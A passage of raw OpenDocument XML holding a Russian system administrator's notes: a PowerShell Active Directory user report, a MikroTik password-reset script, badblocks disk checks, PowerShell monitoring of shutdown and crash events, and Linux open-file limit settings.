      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$NotSurname = Get-ADUser -filter "Enabled -eq '$true' -and Surname -notlike '*' -and Name -ne 'Healthmailbox'"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">$NotFIO = ($NotSurname).count</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Message = "</text:span><text:span text:style-name="T1">На</text:span><text:span text:style-name="T3"> $Date </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> ActiveDirectory </text:span><text:span text:style-name="T1">всего</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пользователей</text:span><text:span text:style-name="T3"> $AllUsers </text:span><text:span text:style-name="T1">из</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">них</text:span><text:span text:style-name="T3">: `n</text:span><text:span text:style-name="T1">Активных</text:span><text:span text:style-name="T3">: $ActiveUsers </text:span><text:span text:style-name="T1">из</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">них</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">служебные</text:span><text:span text:style-name="T3">: $NotFIO. `n</text:span><text:span text:style-name="T1">Заблокированных</text:span><text:span text:style-name="T3">: $DisabledUsers. `n</text:span><text:span text:style-name="T1">Новых</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пользователей</text:span><text:span text:style-name="T3">: $NewUsers `r`n`r`n$WhoUsers"</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Message | Out-File -FilePath <text:s/>"C:\temp\$(Get-Date -Format "dd MMMM yyyy")-UsersAD.txt"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">После выполнения получаем файлик с текущей датой в папке temp.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Скрипт переустановки пароля пользователя MikroTik:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># Скрипт смены пароля пользователя</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># только для исполнения в терминале ROS</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># by Sertik 09/06/2020</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">{</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:global EnterString do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local cont 0; :local string ""</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:while ($cont!=13) do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local key ([:terminal inkey])</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:if ($key!=13) do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:set string ("$string"."$char")}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:set cont $key</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:return $string}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "Please, enter Username:"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local RegUser [$EnterString];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:if ([:len [/user find disabled=no name=$RegUser]]!=0) do={:put "Ok, a user with this name was found"; :put "";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "Please, enter new password for this user:"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local newPass [$EnterString];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[/user remove $RegUser];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[/user add name=$RegUser password=$newPass group=full];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "The user has been re-created, the password has been changed";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put ("New user`s password: "."$newPass");</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "Don't forget to set up access restrictions based on ip addresses";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>} else={:put ("User "."$RegUser "."not found"); :put "";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/></text:span><text:span text:style-name="T1">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скрипт интересен строкой преобразования кода символа из переменной $key, сграбленного с клавиатуры терминала, в сам символ.</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">badblocks - команда для поиска и исправления поврежденных секторов на жестких дисках:</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># lsblk -o NAME,FSTYPE,LABEL,MOUNTPOINT,MODEL</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">NAME <text:s text:c="3"/>FSTYPE <text:s/>LABEL <text:s text:c="4"/>MOUNTPOINT <text:s text:c="14"/>MODEL</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">...</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Базовый синтаксис команды:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># badblocks -v /dev/&lt;имя файла раздела или устройства&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Параметр -v используется для вывода информации о ходе процесса проверки жесткого диска.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># badblocks -v /dev/&lt;имя файла раздела или устройства&gt; &gt; /tmp/badblocks.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># e2fsck -l /tmp/bad-blocks.txt /dev/&lt;имя файла раздела или устройства&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># rm /tmp/badblocks.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Однако, в большинстве случаев будет достаточно однокртного посектороного чтения данных из раздела или со всего устройства.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры использования</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Выбор раздела жесткого диска для проверки</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># lsblk -o NAME,FSTYPE,LABEL,MOUNTPOINT,MODEL</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">NAME <text:s text:c="3"/>FSTYPE <text:s/>LABEL <text:s text:c="4"/>MOUNTPOINT <text:s text:c="14"/>MODEL</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">sdb <text:s text:c="47"/>MAXTOR STM316081</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">├─sdb4 <text:s/>ext4 <text:s text:c="3"/>home <text:s text:c="5"/>/home <text:s text:c="19"/></text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">├─sdb2 <text:s/>ext4 <text:s text:c="3"/>Debian <text:s text:c="28"/></text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">└─sdb1 <text:s/>swap <text:s text:c="38"/></text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">...</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Проверка выбранного раздела на наличие поврежденных секторов</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"># badblocks -v /dev/sdb2</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">Checking blocks 0 to 12697599</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Checking for bad blocks (read-only test): <text:s/>done <text:s text:c="42"/></text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Pass completed, 0 bad blocks found. </text:span><text:span text:style-name="T1">(0/0/0 errors)</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Очевидно, что в ходе проверки раздела поврежденных секторов не было обнаружено.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Объединение файлов командой cat:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Под объединением файлов понимается их соединение. Например, если мы имеем два текстовых файла и в одном из них записана строка:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">My text file 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">А</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">другом</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">My text file 2</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">То после объединения мы получим файл с двумя строками:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">My text file 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">My text file 2</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cat file1 file2 &gt; file12</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">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5" loext:marker-style-name="T2"><text:span text:style-name="T3">cat file1 file2 file3 file4 &gt; myfile</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Powershell мониторинг событий 41, 1074, 6008:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">|||Мониторинг по событию </text:span><text:span text:style-name="T3">41:|||</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 41} |</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ForEach-Object {</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>$flam = New-Object PSObject | Select-Object Date</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>if ($_.ReplacementStrings[4]) {</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>$flam.Date = $_.TimeGenerated</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>$flam</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$StrData=[string]$flam.Date</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">$message = $StrData + " " + "</text:span><text:span text:style-name="T1">Сервер</text:span><text:span text:style-name="T3">: $env:computername" + " " + "</text:span><text:span text:style-name="T1">Система</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">перезагрузилась</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">завершив</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">работу</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">с</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">ошибками</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T1">Возможные причины ошибки: система перестала отвечать на запросы, произошел критический сбой или неожиданно отключилось питание."</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">|||</text:span><text:span text:style-name="T1">Мониторинг</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">по</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">событию</text:span><text:span text:style-name="T3"> 1074:|||</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Events = Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 1074}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat = New-Object System.Management.Automation.PSObject</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty Time ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty User ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty Action ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Events | %{</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.Time = $_.TimeGenerated</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.User = $_.ReplacementStrings[6]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.Action = $_.ReplacementStrings[4]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$StrFlamDat=[string]$FlamDat.Time</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">|||</text:span><text:span text:style-name="T1">Мониторинг</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">по</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">событию</text:span><text:span text:style-name="T3"> 6008|||</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Events = Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 6008}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat = New-Object System.Management.Automation.PSObject</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty Time ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty User ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty Action ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Events | %{</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.Time = $_.TimeGenerated</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">$FlamDat.User = $_.ReplacementStrings[6]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.Action = $_.Message</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$StrFlamDat=[string]$FlamDat.Time</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T2"><text:span text:style-name="T3">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как найти количество открытых файлов в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Значение сохраняется в</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cat</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">proc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sys</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">fs</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">max</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка </text:span><text:span text:style-name="T3">Hard</text:span><text:span text:style-name="T1"> лимит в </text:span><text:span text:style-name="T3">Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ulimit</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">Hn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка </text:span><text:span text:style-name="T3">Soft</text:span><text:span text:style-name="T1"> лимит в </text:span><text:span text:style-name="T3">Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ulimit</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">Sn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы просмотреть значения </text:span><text:span text:style-name="T3">Hard</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">Soft</text:span><text:span text:style-name="T1"> для разных пользователей, переключите пользователя с «</text:span><text:span text:style-name="T3">su</text:span><text:span text:style-name="T1">» на пользователя, ограничения которого вы хотите проверить.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Например:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># su root</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ ulimit -Sn</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T2"><text:span text:style-name="T3">$ ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Как проверить количество системных дескрипторов файлов в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T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3">MySQL</text:span><text:span text:style-name="T1"> / </text:span><text:span text:style-name="T3">MariaDB</text:span><text:span text:style-name="T1"> или веб-сервер </text:span><text:span text:style-name="T3">Apache</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вы можете увеличить лимит открытых файлов в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">, отредактировав опцию ядра </text:span><text:span text:style-name="T3">fs</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">max</text:span><text:span text:style-name="T1">. Для этого используйте утилиту </text:span><text:span text:style-name="T3">sysctl</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Sysctl</text:span><text:span text:style-name="T1"> используется для настройки параметров ядра.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Например, чтобы увеличить ограничение на количество открых файла до 500000, вы можете использовать следующую команду:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># sysctl -w fs.file-max=500000</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вы можете проверить текущее значение для количества открытых файлов с помощью следующей команды:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ cat /proc/sys/fs/file-max</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">vi</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sysctl</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавьте следующую команду:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">fs</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">max</text:span><text:span text:style-name="T1">=500000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cat</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">proc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sys</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">fs</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">max</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T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text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">sysctl</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">p</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установка количества открытых файлов для пользователя в </text:span><text:span text:style-name="T3">Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">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3">root</text:span><text:span text:style-name="T1">, вам необходимо отредактировать следующий файл:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">vi</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">security</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">limits</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если вы администратор </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">, предлагаем Вам ознакомиться с этим файлом.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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text:span text:style-name="T1">Команды, которые вы должны добавить, имеют следующие параметры:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">domain</text:span><text:span text:style-name="T1">&gt; </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">type</text:span><text:span text:style-name="T1">&gt; </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">item</text:span><text:span text:style-name="T1">&gt; </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">value</text:span><text:span text:style-name="T1">&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вот пример установки </text:span><text:span text:style-name="T3">Soft</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">Hard</text:span><text:span text:style-name="T1"> лимитов для пользователя </text:span><text:span text:style-name="T3">dimon</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">## Example hard limit for max opened files</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dimon hard nofile 4096</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">## Example soft limit for max opened files</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">dimon</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">soft</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">nofile</text:span><text:span text:style-name="T1"> 1024</text:span></text:p>
